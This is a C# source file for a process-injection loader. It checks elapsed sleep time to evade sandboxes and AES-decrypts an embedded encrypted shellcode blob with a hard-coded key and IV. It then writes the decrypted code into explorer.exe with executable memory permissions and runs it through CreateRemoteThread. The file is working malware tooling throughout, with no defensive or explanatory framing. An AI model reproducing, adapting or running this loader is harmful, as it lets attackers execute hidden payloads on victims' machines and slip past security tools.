using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
using System.IO;
using System.Security.Cryptography;

namespace Runnerinject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        public static void Main()
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            string MyKey = "66-5F-24-99-F5-CD-5A-97-7B-F4-CD-46-C1-FF-EB-A7-37-1B-A7-B4-D9-CA-90-91-0C-50-3F-25-1E-69-D7-A3";
            string Myiv = "F7-84-3B-ED-06-9F-AC-F7-EB-68-2B-DC-C8-37-92-CC";
            byte[] buf = new byte[1536] {0x1d, 0x8e, 0xb2, 0x70, 0x01, 0x23, 0x34, 0x2a, 0xf7, 0x58, 0xc5, 0xa8, 0x67, 0x9d, 0xc9, 0x01, 0xcd, 0x01, 0xb4, 0xd6, 0xfd, 0x93, 0x97, 0xe0, 0xe8, 0xb4, 0x19, 0x82, 0xf2, 0xa1, 0xa9, 0x80, 0xdc, 0xe9, 0x97, 0x7e, 0xc3, 0x09, 0x46, 0x09, 0xee, 0x04, 0xfd, 0xfe, 0x72, 0x69, 0xc1, 0x61, 0xc3, 0x25, 0x5e, 0x34, 0x45, 0xc2, 0xc3, 0x08, 0x07, 0x2a, 0x54, 0xaf, 0x44, 0x89, 0x25, 0x32, 0x14, 0xa9, 0xef, 0x8c, 0x69, 0xd3, 0x50, 0x14, 0xfc, 0x66, 0xe9, 0xd8, 0xed, 0xee, 0xb2, 0x7c, 0x83, 0x1d, 0x36, 0xee, 0xdb, 0x12, 0x95, 0x07, 0xdb, 0xa1, 0x8e, 0x72, 0x70, 0x5f, 0x65, 0xab, 0x23, 0x0f, 0xa3, 0x67, 0xef, 0x8d, 0xe6, 0x4d, 0x59, 0x46, 0x52, 0xb6, 0x90, 0x21, 0xe2, 0xfd, 0x3e, 0x5a, 0x46, 0x1d, 0x4e, 0x7d, 0xfe, 0x09, 0x29, 0xa5, 0x48, 0x5c, 0x8b, 0x4b, 0x98, 0xf4, 0xc7, 0xd5, 0xfa, 0xec, 0x84, 0x5d, 0x7e, 0x28, 0x3f, 0xe0, 0x33, 0x25, 0x42, 0xe3, 0x06, 0xe1, 0x96, 0x68, 0x0f, 0x3f, 0xf1, 0xe0, 0x5a, 0xef, 0xad, 0xd2, 0x92, 0x66, 0xe3, 0xb2, 0x26, 0xad, 0xc5, 0xf2, 0x0e, 0x53, 0xcd, 0x2a, 0xa8, 0x36, 0xc3, 0xaf, 0x68, 0xbb, 0xf3, 0x95, 0xd1, 0x83, 0x09, 0xa9, 0x0e, 0x29, 0x33, 0x36, 0xe2, 0x15, 0x6e, 0x70, 0x5d, 0x93, 0x51, 0xc6, 0x3b, 0x60, 0x0e, 0x0f, 0x7f, 0x68, 0x38, 0xfe, 0xde, 0x46, 0x59, 0xa2, 0x82, 0x2b, 0xb1, 0x54, 0xee, 0xd6, 0x71, 0x11, 0x3b, 0xa1, 0x43, 0x69, 0x28, 0xc6, 0x74, 0x07, 0xf0, 0x09, 0xb9, 0x43, 0xf6, 0x50, 0x1b, 0x29, 0x76, 0xfa, 0x90, 0x9b, 0xb4, 0x31, 0x69, 0x7e, 0x5e, 0x7a, 0x5b, 0x3b, 0x43, 0xab, 0x88, 0xf5, 0x7c, 0x51, 0x47, 0xdd, 0x61, 0x34, 0xc8, 0x84, 0x34, 0x05, 0x38, 0x32, 0x46, 0x5e, 0x1a, 0x10, 0x5a, 0x37, 0x90, 0xaa, 0x24, 0x51, 0xc2, 0x4e, 0x48, 0x92, 0x57, 0xa5, 0x1a, 0xb6, 0xf3, 0xdb, 0x0a, 0x3c, 0x47, 0x34, 0x36, 0x53, 0x96, 0x77, 0xc6, 0xf5, 0x3c, 0x1d, 0xea, 0xd8, 0xf0, 0x4a, 0x7a, 0xc4, 0x4f, 0x4b, 0x69, 0x42, 0x83, 0xf9, 0x2b, 0xcc, 0x38, 0x45, 0x19, 0x2f, 0x92, 0x01, 0x1d, 0xd4, 0x98, 0xea, 0x28, 0x21, 0xc1, 0x7b, 0x8d, 0x4e, 0x8d, 0xca, 0x41, 0x3a, 0x97, 0x0d, 0x48, 0xd0, 0xed, 0x92, 0xb3, 0x29, 0xde, 0x54, 0xc6, 0x5e, 0xdb, 0x81, 0x18, 0x37, 0x5b, 0xcb, 0xda, 0xd8, 0xf9, 0x2b, 0xe1, 0x53, 0x1a, 0xd0, 0x9c, 0x09, 0xbd, 0x3f, 0xab, 0xda, 0xc3, 0xc3, 0xe3, 0xf1, 0xf9, 0x90, 0x66, 0x5d, 0x23, 0xaf, 0x62, 0x31, 0x07, 0x6f, 0x52, 0xaa, 0x0a, 0x3f, 0x9a, 0xf7, 0x48, 0x57, 0x23, 0xd9, 0xf0, 0x11, 0x3a, 0x53, 0x4a, 0x96, 0x0b, 0x56, 0x59, 0xed, 0xfe, 0xc8, 0xb1, 0xb9, 0x49, 0x0f, 0xd8, 0x6f, 0x45, 0xcd, 0xa2, 0xa3, 0x18, 0x80, 0x78, 0x1c, 0x99, 0x1a, 0x58, 0x97, 0xc8, 0x69, 0xf7, 0xff, 0xd8, 0xb1, 0xa1, 0x8b, 0x41, 0x84, 0x00, 0x97, 0x64, 0xe3, 0xb2, 0x1a, 0x3d, 0xde, 0xd4, 0x1f, 0xcf, 0xfe, 0x1c, 0xeb, 0xcc, 0x0b, 0x95, 0xdb, 0x74, 0xd7, 0x39, 0xd3, 0x7d, 0xa0, 0xba, 0x6f, 0xa8, 0xba, 0x71, 0x05, 0x33, 0x83, 0x24, 0xda, 0x6a, 0x76, 0xfb, 0x9d, 0x41, 0x59, 0x90, 0x23, 0x82, 0x63, 0x57, 0x31, 0x12, 0x72, 0xc9, 0x43, 0x59, 0xfe, 0xc3, 0xd9, 0x24, 0x52, 0x56, 0x2b, 0xd8, 0x43, 0x51, 0x40, 0x9d, 0x11, 0x0f, 0xf8, 0xa9, 0xda, 0xf1, 0x3b, 0xf7, 0x6e, 0x0f, 0x6d, 0xac, 0x90, 0x03, 0xc5, 0x84, 0x73, 0x11, 0x0b, 0x43, 0x0c, 0xcf, 0x08, 0xce, 0x4a, 0x94, 0x6c, 0x87, 0x38, 0x75, 0x97, 0x6a, 0x73, 0x71, 0x9d, 0xe3, 0xe7, 0x84, 0xed, 0xc3, 0x05, 0x75, 0xf2, 0xcc, 0xea, 0x2e, 0xa9, 0xd7, 0xfd, 0x92, 0xba, 0xc3, 0x56, 0x14, 0xdd, 0x9e, 0x72, 0x0e, 0xd1, 0x1e, 0xb9, 0xae, 0x9d, 0x36, 0x3b, 0xc4, 0x42, 0x4d, 0xb3, 0x2b, 0x29, 0x51, 0xd4, 0x0f, 0xd6, 0xaf, 0x0e, 0x69, 0x7b, 0x28, 0x1b, 0x75, 0x0f, 0xea, 0x73, 0x25, 0x51, 0x9a, 0x13, 0x3a, 0x5b, 0x21, 0xe9, 0xdc, 0x02, 0xae, 0xba, 0xa8, 0xe3, 0xcd, 0x9a, 0x40, 0x39, 0x7c, 0x05, 0x1f, 0x24, 0x8d, 0x79, 0x39, 0x6a, 0x6d, 0x51, 0xf7, 0x4a, 0x93, 0x29, 0x84, 0x27, 0x41, 0x99, 0xec, 0xb4, 0xab, 0xc8, 0x6b, 0xc2, 0x52, 0xc1, 0x3d, 0x7b, 0x79, 0x89, 0x10, 0xa5, 0x51, 0xe4, 0xb2, 0xb6, 0x07, 0x96, 0xc6, 0xcb, 0xac, 0x73, 0xd0, 0xf3, 0xa1, 0xff, 0xe1, 0xa9, 0x0b, 0xdf, 0xdf, 0x69, 0xf6, 0xd9, 0xed, 0x4f, 0xbf, 0x44, 0x4d, 0xc6, 0x07, 0xb5, 0xaf, 0xff, 0x5d, 0x72, 0x98, 0x12, 0x1f, 0x30, 0x55, 0xf7, 0xfa, 0xf4, 0x15, 0x4b, 0x17, 0x1d, 0xff, 0x28, 0x16, 0x48, 0x36, 0x0a, 0x4c, 0x88, 0x8e, 0x98, 0xee, 0xa1, 0xd3, 0xba, 0x93, 0xf7, 0xe4, 0xb2, 0x65, 0xb6, 0x3c, 0x49, 0x9e, 0xc2, 0xd6, 0xca, 0xf3, 0xe0, 0x3f, 0x93, 0xb2, 0xb7, 0x60, 0x2d, 0x73, 0x20, 0xe7, 0x4d, 0x4a, 0x3f, 0xf0, 0x90, 0x05, 0x63, 0x96, 0xdc, 0x57, 0x11, 0x21, 0x6f, 0x3b, 0x4c, 0xc6, 0x09, 0xb6, 0xec, 0x7c, 0xa9, 0xf1, 0xe9, 0x19, 0x6b, 0x7c, 0x56, 0x17, 0xbb, 0x33, 0x5d, 0xf1, 0x77, 0xd7, 0x73, 0x16, 0x39, 0x7d, 0x8c, 0xb8, 0x81, 0x08, 0x80, 0x91, 0xcd, 0x8a, 0x64, 0xad, 0xe3, 0xcb, 0x88, 0x59, 0x23, 0x42, 0x9f, 0xbe, 0x3d, 0x29, 0x7a, 0xf8, 0x83, 0x34, 0xfd, 0x92, 0x4a, 0x5c, 0xe1, 0xec, 0xb0, 0x9a, 0x82, 0xd1, 0x3b, 0x01, 0xe7, 0xa1, 0xa5, 0x43, 0xe8, 0x20, 0x79, 0xae, 0x39, 0xb9, 0x05, 0xea, 0x70, 0x9f, 0x02, 0xca, 0x9d, 0xe1, 0x10, 0xfa, 0xa2, 0x71, 0x1b, 0x40, 0xdb, 0x1f, 0x26, 0x1f, 0xc9, 0x4a, 0x56, 0x3d, 0xe8, 0x07, 0x18, 0xe2, 0x04, 0x6e, 0x02, 0x14, 0x9e, 0xa6, 0x1d, 0xc2, 0x6d, 0x15, 0x05, 0x9f, 0x57, 0x56, 0x68, 0x03, 0xc7, 0x5b, 0x18, 0xef, 0x16, 0x48, 0xff, 0x04, 0xcc, 0x31, 0xc7, 0xfb, 0xf2, 0x5c, 0xae, 0x01, 0x1e, 0x7a, 0x47, 0xba, 0x9a, 0xbb, 0x4b, 0x96, 0xba, 0xf8, 0x4b, 0xad, 0x61, 0xfb, 0x12, 0x7d, 0x21, 0x27, 0xc0, 0x12, 0xe9, 0x46, 0x61, 0xa6, 0x83, 0xf5, 0x1c, 0xad, 0x10, 0x65, 0xf4, 0xae, 0xb6, 0xfe, 0x58, 0x23, 0x5e, 0x50, 0xd4, 0xf0, 0x64, 0x42, 0xc1, 0xfc, 0x75, 0x48, 0x7c, 0x3f, 0x10, 0x47, 0x27, 0xee, 0x4c, 0x40, 0x99, 0x14, 0x40, 0x76, 0x03, 0x33, 0xf0, 0xc8, 0xe0, 0x96, 0xad, 0x01, 0x01, 0x52, 0x06, 0xa8, 0x20, 0x76, 0xd9, 0x9a, 0xaf, 0xb9, 0xf2, 0x1f, 0x87, 0xb5, 0x86, 0xfa, 0x3f, 0x5b, 0x7b, 0x76, 0x10, 0x9e, 0xd4, 0x6d, 0x26, 0xa7, 0xcd, 0x4c, 0x64, 0x9f, 0xa7, 0x0c, 0x92, 0x1c, 0xcc, 0x0e, 0xee, 0x3b, 0x25, 0xdd, 0x6c, 0x91, 0x0b, 0x18, 0xcf, 0xa1, 0xdf, 0xc7, 0xe3, 0x3e, 0xa2, 0x54, 0x6f, 0xbe, 0x36, 0x07, 0xd0, 0x74, 0x82, 0xfa, 0xa0, 0xc4, 0xe4, 0xc3, 0x6c, 0x38, 0xc4, 0x54, 0xef, 0x47, 0x43, 0x7b, 0x0f, 0xc5, 0x4e, 0xcc, 0x3c, 0xc1, 0x95, 0xbe, 0xbe, 0xa9, 0x46, 0x8f, 0x34, 0x13, 0x88, 0x59, 0xcd, 0x59, 0xd6, 0xdb, 0x41, 0x56, 0xe0, 0x25, 0xf0, 0x3d, 0xdc, 0x6a, 0x8d, 0x56, 0xb5, 0xa0, 0xd2, 0x71, 0x9e, 0x60, 0xaf, 0xd4, 0x11, 0xe5, 0x07, 0x94, 0x8e, 0xa2, 0x84, 0xd2, 0x52, 0x28, 0x7f, 0xd8, 0x3c, 0x0e, 0x13, 0xe5, 0x09, 0x4d, 0x47, 0x35, 0xf4, 0x9d, 0x5f, 0xdd, 0x35, 0xc9, 0x63, 0xf9, 0x3d, 0x7e, 0x79, 0x18, 0x0a, 0x1d, 0x2f, 0xf0, 0x44, 0x3e, 0x62, 0x1e, 0x51, 0xe9, 0x50, 0x21, 0xa5, 0xeb, 0xa5, 0xe6, 0x46, 0x63, 0x9c, 0xcd, 0x1f, 0xb5, 0x57, 0x8d, 0x6e, 0x86, 0x54, 0x29, 0x88, 0xf8, 0xef, 0x60, 0xf4, 0x36, 0xa6, 0xe5, 0xcd, 0x93, 0x51, 0xbe, 0xf0, 0xd4, 0xfb, 0xa1, 0xc4, 0x7a, 0x80, 0xcb, 0xb3, 0x74, 0x3c, 0x0e, 0x67, 0xe3, 0xbc, 0x6b, 0x68, 0xad, 0xee, 0xcc, 0xd4, 0x01, 0x55, 0xe4, 0x6e, 0x4e, 0x63, 0x34, 0x05, 0x61, 0x0d, 0x25, 0xb5, 0x85, 0x71, 0x35, 0xf2, 0xb9, 0xb7, 0xb3, 0x2f, 0x77, 0x9b, 0xc3, 0xf3, 0x3e, 0x23, 0x90, 0x03, 0x39, 0xca, 0x56, 0x40, 0xf0, 0xb1, 0x58, 0x80, 0x5a, 0x28, 0x26, 0x1b, 0xb8, 0x0c, 0xb1, 0x01, 0xf5, 0x72, 0x74, 0xa4, 0xca, 0x16, 0x05, 0x21, 0x32, 0xfb, 0x8e, 0xc7, 0x43, 0x4a, 0x99, 0x3b, 0xae, 0xaa, 0x15, 0xa0, 0x14, 0xe6, 0xd9, 0x34, 0xd8, 0xe9, 0x1e, 0xca, 0xed, 0x75, 0x79, 0xcf, 0x18, 0x89, 0xf0, 0x66, 0xeb, 0x42, 0x81, 0x09, 0xa0, 0x72, 0x58, 0x60, 0x1e, 0xcc, 0x74, 0xad, 0x21, 0xc3, 0xff, 0xa6, 0xaf, 0x9c, 0xc3, 0x92, 0xd1, 0x99, 0x9f, 0xb6, 0x04, 0xbf, 0x6f, 0x89, 0xea, 0x44, 0x02, 0xae, 0x9b, 0x8a, 0x12, 0x9b, 0xa3, 0x02, 0xe2, 0x81, 0x96, 0x26, 0x04, 0x82, 0xd9, 0xd0, 0x3b, 0xc6, 0xe5, 0xc4, 0xd1, 0xad, 0x71, 0x0c, 0x89, 0xa8, 0x41, 0x5c, 0x74, 0xf6, 0x72, 0x88, 0xe7, 0x17, 0x59, 0xe5, 0x58, 0xb0, 0x97, 0x18, 0xf3, 0xa1, 0x6e, 0x69, 0x2b, 0x7c, 0x83, 0x29, 0x2e, 0xab, 0xaa, 0xd8, 0x51, 0xb4, 0x69, 0x18, 0x53, 0x86, 0xa3, 0x4e, 0x5d, 0x8a, 0x30, 0xfd, 0xa5, 0x75, 0x46, 0xdd, 0xdf, 0x54, 0x62, 0x91, 0x00, 0x51, 0xaa, 0x65, 0x7a, 0x5b, 0xfb, 0xc3, 0x5f, 0x27, 0x31, 0xd8, 0xca, 0xe7, 0xdf, 0x47, 0x13, 0xd8, 0x0b, 0xe0, 0x91, 0x1d, 0x71, 0xc1, 0xd5, 0xe7, 0x93, 0x1c, 0x1c, 0x33, 0x2e, 0x46, 0x8a, 0xb6, 0x8d, 0xef, 0x36, 0xd4, 0x97, 0x2d, 0x40, 0x8b, 0x6f, 0xcf, 0xda, 0x7c, 0xdb, 0x34, 0xb5, 0x4d, 0xbd, 0x1c, 0x62, 0xf4, 0xc0, 0x27, 0xe3, 0x65, 0x3b, 0x1b, 0xb6, 0x48, 0x38, 0x60, 0x15, 0xa9, 0xa8, 0x87, 0x46, 0x9a, 0xde, 0x98, 0x77, 0x81, 0x4b, 0x9f, 0xd7, 0x46, 0x5b, 0x98, 0xb5, 0x81, 0xe2, 0x0a, 0x84, 0xf0, 0xc8, 0xa4, 0x6f, 0x71, 0xa2, 0x9e, 0xed, 0x54, 0x81, 0x67, 0x00, 0x49, 0x62, 0x84, 0xbf, 0x9b, 0x59, 0xa9, 0x80, 0x59, 0x2e, 0x4e, 0x6b, 0x59, 0x7e, 0x92, 0x6a, 0x33, 0xce, 0x7e, 0xd1, 0xd6, 0x81, 0xf5, 0x8d, 0x65, 0x66, 0xae, 0x5d, 0xdb, 0x1e, 0xf4, 0x4f, 0x9d, 0x69, 0x45, 0x77, 0x88, 0x43, 0xeb, 0x80, 0x0e, 0x1a, 0x8c, 0xfa, 0x12, 0x8b, 0x41, 0xf6, 0x4e, 0x73, 0xab, 0xf7, 0x28, 0x4b, 0x1b, 0x79, 0x0c, 0x59, 0xeb, 0xc9, 0xab, 0x5c, 0x1c, 0x22, 0x83, 0xa4, 0x94, 0x13, 0xe8, 0xc3, 0x32, 0x92, 0x0e, 0x2c, 0x96, 0x4d, 0xb5, 0xaa, 0x75, 0xae, 0x45, 0x82, 0x2a, 0xe2, 0x7b, 0x77, 0x5e, 0xb5, 0x7c, 0x6b, 0x73, 0x6e, 0xe8, 0xef, 0x31, 0x20, 0xcc, 0xd5, 0x01, 0xec, 0x02, 0x5f, 0x1c, 0x46, 0x58, 0xdf, 0xbf, 0x43, 0x69, 0xf8, 0xa2, 0x33, 0x29, 0x75, 0x5d, 0x55, 0x64, 0xfb, 0x21, 0x8f, 0x0a, 0xbb, 0x4b, 0x58, 0xcc, 0x8c, 0x25, 0xe4, 0x30, 0x59, 0x67, 0x40, 0x59, 0x72, 0x99, 0xaa, 0x6e, 0x00, 0x34, 0x4b, 0x77, 0x46, 0xf3, 0x3f, 0x30, 0xc0, 0x48, 0xb5, 0x9e};
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);


            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            Process[] localByName = Process.GetProcessesByName("explorer");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, e, e.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }

            return plaintext;
        }
    }
}